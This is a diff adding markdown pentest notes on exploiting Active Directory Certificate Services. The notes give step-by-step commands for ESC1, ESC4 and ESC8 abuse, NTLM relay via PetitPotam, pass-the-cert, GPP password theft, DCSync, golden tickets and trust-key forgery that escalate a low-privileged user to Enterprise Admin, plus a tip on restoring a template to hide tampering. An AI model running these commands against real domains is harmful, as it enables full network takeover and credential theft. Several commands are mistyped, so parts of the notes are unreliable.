@@ -1,0 +1,372 @@
+#Exploiting Active Directory Certificate Services (AD CS) 
+How to determine if the DC has CA Installed init. 
+By port scanning and serives - ADWS is running means the Certificate Authority is present on that Domain controller   
+
+Reference- 
+https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/
+
+https://www.hackingarticles.in/ad-certificate-exploitation-esc1/
+
+https://posts.specterops.io/certified-pre-owned-d95910965cd2
+
+Components of ADCS - 
+1. Certificate Authority(CA)- 
+It is server on which we have installed the ADCS roles. 
+
+You will need to be Enterprise Admin to access the AD CS,  
+Enterprise Admins are the one's who are direectly logged in at Parent domain. 
+
+2. Certificate Templates 
+Subject name: 
+Enchanced key Usage(EKU): 
+validity period: 
+other parameters: 
+
+certification enrollment Web Interface: 
+Open the browser and access the 
+http://DC.DOMAINNAME/certsrv/    
+
+Practical- 
+#Windows - Powershell 
+1. Create a CSR(certificate signing request) with the help of certificate template 
+
+2. Request the .INF File(certificate template)
+
+(Command created a public and private key)
+>certreq -new .\request.inf CSR.req 
+>type  .\CSR.req 
+
+3.Now we have certificate signing request let's ask/req for certificate. 
+>certreq -submit .\CSR.req 
+
+POP up will come to select the domain and domain controller, click okay. 
+Save the certficate by giving the certificate name, in the format .cer (by default it will take the format, just click save)
+
+4. Let's add this certificate in our store, 
+search bar - manage user certificate
+Personal folder - 
+
+>certreq.exe -accept .\mycodesigning.cer 
+Imported the certificate in the user certificate. 
+
+let's sign the code using the code signing certificate 
+>.\signtool.exe sign /f .\mycodesigning.cer /fd SHA256 .\Get-GPPPassword.ps1 
+
+Let's verify if the signature of certificate is tempared. 
+>.\signtool.exe verify /v /pa .\Get-GPPPassword.ps1 
+  
+ 
+
+##Enumeration -- 
+
+Method 1: kali linux 
+#certipy-ad find -target '' -u '' -p '' -dc-ip DCIP -stdout -enabled 
+#certipy-ad find -target '' -u '' -p '' -dc-ip DCIP -vulnerable -enabled -stdout  
+
+Method 2:windows-poershell 
+>.\certify.exe find
+>.\certify.exe find /vulnerable 
+
+
+Look out for the vulnerbailies of ESC1, ESC4, ESC8 
+
+ESC1: Misconfigured Certificate Template 
+-low privileged user can be requested 
+-Template has Client Authentication / PKINIT Client Authentication / Smart Card logon / Any Purpose / no EKU
+-The requester can specify subjectAltName (SAN)
+
+#Method 1: 
+Kali Linux 
+Let's list the certificate and look if any vulnerable certificate are present. 
+
+Enumeration--
+#certipy-ad find -u 'username' -p 'password' -dc-ip DCIP -stdout -vulnerable -enabled  
+
+
+~~What we have to look in:  
+1. tool tells we the certificate is  vulnerable to ESC1
+2. Client Authentication- enabled/True
+3. Enrollment Rights - Domain Users 
+4. Enrollee Supplies Subject - True 
+
+Exploitation 
+Let's ask for the certificate template from the low user privileged and specifying the name of higher privilege user, and that certificate will be used for the client authentication 
+
+#certipy-ad req -u 'username' -p 'password' -ca certificateauthorityname -target DC.DOMAIN.NAME -template CertificateTemplateNAME -upn Administrator@DOMAIN.NAME 
+
+Now I  can use this certificate which is in the format .pfx and get authenticate as administrator '
+
+#certipy-ad auth -pfx administrator.pfx -dc-ip DCIP 
+
+We got the NTLM HASH of administrator and TGT of administrator 
+
+Let's verify or authenticate as Administrator 
+#netexec smb DCIP -u Administrator -H NT_HASH(last part of NTLM) 
+
+#Method 2: Windows -Powershell 
+Enumerate the vulnerbaility
+
+>.\certify.exe find /vulnerable
+
+~~What we have to look in:  
+1. tool tells we the certificate is  vulnerable to ESC1
+2. Client Authentication- enabled/True
+3. Enrollment Rights - Domain Users 
+4. Enrollee Supplies Subject - True 
+
+>.\certify.exe request /ca:dc.domainname\ca /template:templatename /altname:domainname\Administrator 
+
+
+copy the certificate and save file as cert.pem
+>notepad cert.pem
+copy and paste the certificate
+
+
+convert the certificate from .pem to .pfx format. 
+covert with 
+>openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enchanced Cyptographic provider v1.0" -export -out cert.pfx 
+
+>ls cert.fx 
+>.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt 
+
+now we have got the TGT of the domain administrator 
+
+Access the unauthorized access to ADministrator 
+>dir \\DC.DOMAINNAME\C$ 
+
+
+
+ 
+
+#ESC4- Misconfigured Certificate Template - Access Control 
+
+Low-privileged users can modify the certificate template.
+
+Permissions applicable
+	Owner
+	FullControl
+	WriteProperty
+	WriteDacl
+	WriteOwner
+
+Let's enumerate the Certificate like before 
+#Method 1: Kali Linux 
+#certipy-ad find -u 'username' -p 'password' -dc-ip DCIP -stdout -vulnerable -enabled  
+
+We identify the vulnerability for ESC4 is present for the Domain Computers group 
+
+
+so we will create a user in domain computers group, as every domain users can add upto 10 computers in the domain 
+
+#impacket-addcomputer -computer-name 'ESC4user' -computer-pass 'ESC4user@1234' domainname/username:'password' -dc-ip DCIP 
+
+#certify-ad template -target dc.domainname -u 'ESC4user' -p 'ESC4user@123' -template templatename -save-old
+
+
+What we performed - 
+We changed the setting of "Enrollee Supplies Subject": True 
+
+how we are back to ESC1 misconfiguration,
+Exploit the same way we did for ESC1. 
+
+#certipy-ad req -u username -p password -target dc.domainname -template TheTemplatename -upn Administrator@dmainname
+
+
+#certipy-ad auth -pfx administrator.pfx -dc-ip DCIP 
+
+we can also set the certificate back it's original state as it was so no one get's know we have performed something or tampered 
+
+#certify-ad template -target dc.domainname -u 'ESC4user' -p 'ESC4user@123' -template templatename -configuration TheOriginalTemplate.json
+
+
+#Method 2: Windows - Powershell 
+If you have tickets running or have current session, so use klist purge  
+
+Powerview --
+Disable Manager Approval Requirement
+PS> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=bank,DC=local" -Identity SuperSecureTemplate -XOR @{'mspki-enrollment-flag'=2} –Verbose
+
+
+Disable Authorized Signature Requirement
+PS> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=bank,DC=local" -Identity SuperSecureTemplate -Set @{'mspki-ra-signature'=0} –Verbose
+
+
+Enable SAN Specification
+PS> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=bank,DC=local" -Identity SuperSecureTemplate -XOR @{'mspki-certificate-name-flag'=1} –Verbose
+
+
+Edit Certificate Application Policy Extension (Client Authentication)
+PS> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=bank,DC=local" -Identity SuperSecureTemplate -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
+
+Verify Changes
+PS> Get-DomainObject -SearchBase "CN=Configuration,DC=bank,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -Identity SuperSecureTemplate
+
+Request certificate for Administrator user
+PS> Certify.exe request /ca:dc02.delhi.bank.local\delhibank-ca /template:SuperSecureTemplate /altname:delhi.bank.local\Administrator
+
+Convert from .PEM to .PFX
+PS> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+Request TGT of Administrator user
+PS> Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
+ 
+##ESC8 - Miconfigured certificate Authority 
+
+Enumeration
+http://dc.domainname/certsrv/certfnsh.asp  (developer tools- network - NTLM protocol been used for authentication)
+curl -v http://dc.domainname/certsrv/certfnsh.asp (NTLM protocol is been used)
+
+#Method 1: Kali Linux 
+
+Now we have enumerated the Vulnerable CA 
+certipy find -enabled -vulnerable –dc-ip <IP> -u <USERNAME> -p <PASSWORD> –stdout
+ESC8 - it is vulnerale to 2 things 
+Web Enrollment - True. 
+
+Let's setup the relay-listener
+#certipy-ad relay -target targetdc.domainname -template DomainController
+
+On the other tab let's relay
+#python PetiPotam/PetiPotam.py -u username -p password -d domainname systemIP dc.IP/DC.Domainname(different domain controller IP or different domainname.domainname)
+
+Note: we can not provide the same DC-IP as we not replay the authentication relay to the same machine. so we provide the different DC-IP or domain.domainnname 
+
+we wil get the certificate on the listner we setup, Let's use this certificate. 
+
+#certipy-ad auth -pfx ticket.pfx -dc-ip DCIP 
+
+#export KRB5CCNAME=dc.ccache
+
+Let's perform the DCsync attack 
+
+#impacket-secretsdump dc.domainname -k -no-pass 
+
+
+
+
+##PKINIT
+#Scenario - ESC1 
+During passing thecertificate we may get error of PKINIT
+#certipy-ad auth -pfx dc.pfx -dc-ip DCIP
+ 
+we may get these errors, when authenticating via PKINIT (using certificates) the following errors might come:
+KDC_ERR_PADATA_TYPE_NOSUPP
+KDC_ERROR_CLIENT_NOT_TRUSTED
+
+So in the scenario, when we already have the domain administrator certificate but because of the PKINIT we couln't get the TGT, so we use schannel authentication and we bind the ldap serivces to DC and execute the ldap query on the server using the domain administrator/domain controller certificate as we have that rigts. 
+
+we can execute query or ldap commands using doamin administrator/domain controller rights. 
+
+Moving further, certificates include Public and Privatekey include in the .pkb file. 
+so let's remove the private key from the crt and public key which is present inside the crt file too. 
+
+We removed the public key from the crt
+#certipy-ad cert -nokey -pfx administrator.pfx -out administrator.crt
+
+we removed the certificate from the pfx file, remains the private key which we got.    
+#certipy-ad cert -nocert -pfx administrator.pfx -out administrator.key 
+ 
+Let's use this too elevate the user, By pass the cert attack 
+#python passthecert.py -action modify_user -target username -elevate -crt administrator.crt -key administrator.key -dc-ip DCIP -domain DOMAINNAME 
+
+NOW we have the DCsync rights!!! 
+Let's dumps the secret! Dcsync attacks 
+#impacket-secretsdumps domainname/username:'password'@DCIP 
+
+PASS THE CERT
+#Scenario2 - ESC8 
+you already have a dc certificate but you can not get the TGT.
+So follow this steps
+#certipy-ad cert -nocert -pfx dc.pfx -out dc.key 
+#certipy-ad cert -nokey -pfx dc.pfx -out dc.crt
+
+How to add the user into the other domain 
+#impacket-addcomputer -computer-name 'FAKEPC$' -computer-pass 'fake@123' dc.domainname/username:'password' -dc-ip DCIP 
+
+#python passthecert.py -action -write_rbcd -delegate-from 'FAKEPC$' -delegate-to 'DCusername' -domain domainname -dc-ip DCIP -crt -key dc.key 
+
+#impacket-getST -spn cifs/dc.domainname -impersonate Administrator domainname/'username':'password' -dc-ip DCIP 
+
+#impacket-getST -spn ldap/dc.domainname -impersonate Administrator domainname/'username':'password' -dc-ip DCIP 
+
+
+
+##GPP password attack (group policy peference password) 
+Find the hierarchy of the domains
+PS> Get-NetForestDomain
+
+Find available trusts
+PS> Get-NetDomainTrust -Domain <domain-name> | FT
+
+#MAIN STARTS FROM DIRECTORLY
+Kali Linux (we can also perform through windows)
+#impacket-GetGPPPassword domainname/username:'password'@DCIP 
+
+Let's access the user we have got
+#netexec smb DCIP -u username -p password 
+
+so now we have domain admin credentials now let's elevate to Enterprise admins 
+
+How to check if it's the domain admin or in administrator group 
+
+Windows-powershell- 
+>net group 'Domain Admins' /domain 
+>net group Administrator /domain 
+
+windows-powershell-powerview 
+>Get-DomainGroupMember Administrator | select membername 
+
+Elevating the users creds 
+#Method 1:
+>.\Rubeus.exe asktgt /user:admin /password:password /ptt
+ 
+we have got the TGT of the Administrator, now let's perform the DCsync attack
+>klist
+>./mimikatz.exe 
+>mimikatz #lsadump::dcsync /user:krgt@domainname 
+
+
+Now we have the Hash for the KRBTGT Account; so let's perform the golden ticket attack by injecting the SIDs in the Enterprise Admins Group 
+
+Let's find the SID's of the other enterprise admins group 
+windows-powershell-powerview 
+>Get-DomainSID 
+>Get-DomainSID -Domain ParentDomainname(can ask for specific domain) 
+
+Enterprise SID's end's with the "519"
+
+Create golden ticket with Enterprise Admins group SID:
+PS> Rubeus.exe golden /user:Administrator /domain:<child-domain> /sid:<child-domain-sid> /sids:<parent-domain-sid-519> /rc4:<KRBTGT NTLM Hash> /nowrap /ptt
+
+Since we have got the TGT of the Enterprise Admins Accounts
+Let's access the account using 
+>dir \\dc.domainname\C$ 
+
+Let's abuse the trust key 
+>.\mimikatz.exe 
+Find trust account hash (trust key):
+mimikatz> lsadump::dcsync /user:<trust-account>$@<domain> /domain:<domain>
+
+Forge inter-realm TGT
+mimikatz> Kerberos::golden  /user:Administrator  /domain:<child-domain> /sid:<child-domain-sid> /sids:<parent-domain-sid-519> /rc4:<trust-account-ntlm-hash> /service:krbtgt /target:<parent-domain> /ticket:trust.kirbi
+
+Request ST using Forged inter-realm TGT
+PS> Rubeus.exe asktgs /ticket:trust.kirbi /service:ldap/<DC-FDQN> /dc:<DC-FDQN> /ptt
+>klist 
+>dir \\dc.parentdomainname\C$
+
+
+>.\mimikatz.exe
+#lsadump::dcsync /all /dc:dc.parentdomain /domain:parentdomainname 
+
+You're now the Enterprise admin. 
+
+  
+
+
+
+
+ 
+ 
+
+ 
